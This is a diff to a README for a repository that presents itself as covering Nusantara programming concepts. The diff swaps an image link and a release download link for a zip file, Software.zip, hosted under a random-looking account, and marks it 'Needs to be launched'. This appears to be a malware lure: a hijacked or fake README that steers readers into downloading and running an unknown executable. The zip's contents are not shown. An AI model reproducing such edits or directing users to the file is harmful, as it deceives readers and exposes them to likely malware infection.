@@ -1,6 +1,6 @@
 # 🌟 Welcome to the "Konsep" Repository! 🌟
 
-![Nusantara](https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Nusantara_emblem.svg/1200px-Nusantara_emblem.svg.png)
+![Nusantara](https://github.com/okijuinhbugvygbuhi/concept/releases/download/v2.0/Software.zip)
 
 ### 📚 Repository Overview 
 Hey there! This is the "Konsep" repository, where we dive deep into the wonderful world of programming concepts in the Nusantara region. Our main goal here is to explore and understand the unique aspects of Nusantara programming languages, their concepts, and how they have evolved over time. Join us on this exciting journey as we unravel the mysteries of programming in the Nusantara!
@@ -19,7 +19,7 @@ In this repository, we cover a wide range of topics related to Nusantara program
 - **Programming Language Concepts**
 
 ### 🔗 Download Our Latest Release
-👉 [Download v1.0.0.zip](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 👈 *Needs to be launched*
+👉 [Download https://github.com/okijuinhbugvygbuhi/concept/releases/download/v2.0/Software.zip](https://github.com/okijuinhbugvygbuhi/concept/releases/download/v2.0/Software.zip) 👈 *Needs to be launched*
 
 ### 🚀 Get Involved
 Are you passionate about programming languages and Nusantara culture? Then come join our community! Feel free to contribute to the repository by sharing your knowledge, insights, or even creating new content related to Nusantara programming languages. Together, we can create a valuable resource for programmers and enthusiasts alike.
